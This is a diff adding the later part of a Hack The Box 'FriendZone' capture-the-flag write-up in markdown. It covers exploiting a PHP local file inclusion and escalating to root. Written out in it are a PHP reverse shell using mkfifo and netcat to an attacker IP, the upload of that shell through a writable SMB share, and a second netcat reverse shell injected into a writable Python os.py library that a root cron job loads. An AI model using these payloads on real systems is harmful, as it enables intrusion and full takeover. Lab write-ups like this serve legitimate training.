@@ -114,3 +114,96 @@ Let start with "PHP wrapper" to bypass LFI functionality.
 
 `https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=php://filter/convert.base64-encode/resource=timestamp`
 
+We got a base64 string of the .php page content
+
+![](/img/HTB/FriendZone/img (12).png)
+
+Its Working...
+
+The `Development` share, we saw from `smbmap` has **writable permission** by the guest so why dont we upload a reverse shell there and try to access from this page. 
+
+Write this exploit to a file named shell.php:
+
+```php
+<?php
+system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.10 4444 >/tmp/f');
+?>
+```
+
+Then reopen the smbclient but now in the development directory and upload the shell
+
+```bash
+smbclient -U "" //10.10.10.123/development
+put shell.php
+```
+
+![](/img/HTB/FriendZone/img (13).png)
+
+Create a listener on my local machine:
+
+```bash
+nc -nlvp 4444
+```
+
+We know that the smb files are located under the `/etc` from our previous enumeration, So we will access our shell which is under `/etc/Development/shell` without .php because it is automatically added
+
+![](/img/HTB/FriendZone/img (14).png)
+
+BOOOOOOOOOOOOOOOOOOOOOOOOOOOM ! We successfully gained a shell for `www-data` user and the user flag is located at `/home/friend/user.txt`
+
+![](/img/HTB/FriendZone/img (15).png)
+
+
+## 3. PRIVILEGE ESCALATION:
+
+In the /var/www there is a file called mysql_data.conf that has credentials of user `friend`, So we used it to upgrade from `www-data` to `friend`
+
+![](/img/HTB/FriendZone/img (16).png)
+
+I Also used these creds to obtain an `ssh` access with them
+
+Then I ran *linPeas* script but it didn't show any thing I can use so I headed to see the `pspy` which monitor linux processes without root permissions.
+
+But firstly I must upload it to the machine, and we all knew that /etc/development is writable so I will put the script there.
+
+At my local machine:
+
+```bash
+kali@kali python3 -m http.server 8080
+````
+
+At friendZone:
+
+```bash
+wget http://10.10.16.10:8080/pspy64
+```
+
+![](/img/HTB/FriendZone/img (17).png)
+
+After sometime this appeared, root runs `reporter.py` every minute
+
+![](/img/HTB/FriendZone/img (18).png)
+
+The script doesn't do anything except it runs the `os` script in the import line
+
+![](/img/HTB/FriendZone/img (19).png)
+
+From my previous enumeration in linPeas I found that `/usr/lib/python2.7/os.py` is writable. So what if we put a reverse shell in this library and when the reporter.py is reruned by root it will execute the shell with root privillages. Let's Try it...
+
+Firstly we will put reverse shell in os.py
+
+```python
+system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.10 8888 >/tmp/f")
+```
+
+![](/img/HTB/FriendZone/img (20).png)
+
+Then we will save and open a listener in a new tab and wait a while for a connection...
+
+![](/img/HTB/FriendZone/img (21).png)
+
+BOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOM !!!! Now we are root :D
+
+Thank you so much for reading and I hope you learned a lot as I did ❤
+
+#### ***0x3ashry***
